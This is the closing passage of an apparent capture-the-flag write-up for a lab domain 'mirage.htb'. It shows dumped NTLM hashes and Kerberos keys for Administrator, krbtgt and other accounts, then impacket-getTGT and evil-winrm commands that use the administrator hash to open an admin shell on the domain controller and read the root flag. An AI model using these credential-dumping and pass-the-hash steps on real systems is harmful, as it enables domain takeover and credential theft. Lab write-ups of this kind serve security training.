mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:cca4dd391b30c7da2602ee2df2f8aac25ab4ab8ecfd4e97c648c38bf805f0d15
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:a834d7c5cbc2b36c3207b7c6f623c201
mirage.htb\javier.mmarshall:des-cbc-md5:312a9286a74c857f
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
Mirage-Service$:des-cbc-md5:c42ffd455b91f208
[*] Cleaning up...
```

## AdminShell and root.txt

```bash
impacket-getTGT mirage.htb/administrator -hashes <REDACTED>
export KRB5CCNAME=administrator.ccache
evil-winrm -i dc01.mirage.htb -r mirage.htb
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<REDACTED>
```